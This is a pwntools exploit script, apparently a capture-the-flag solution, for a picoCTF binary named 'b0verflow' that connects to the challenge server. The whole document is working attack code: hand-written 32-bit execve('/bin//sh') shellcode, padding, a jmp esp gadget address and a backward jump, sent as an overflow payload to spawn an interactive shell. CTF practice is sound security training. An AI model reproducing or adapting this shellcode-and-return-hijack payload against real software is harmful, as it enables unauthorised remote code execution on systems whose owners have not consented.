#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./b0verflow", checksec=False)
libc = exe.libc

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x0804859F
        c
	''')
#input()

jump_esp = p32(0x08048504)

sub_esp_asm = asm('''

        jmp $-0x28

        ''')

shellcode = asm('''

        push 6845231
        push 1852400175
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov eax, 0x0b
        int 0x80

        ''')

payload = shellcode +  b'A'*(36 - len(shellcode)) + jump_esp + sub_esp_asm
sla(b"What's your name?", payload)

print(shellcode)
log.info(len(shellcode))

p.interactive()
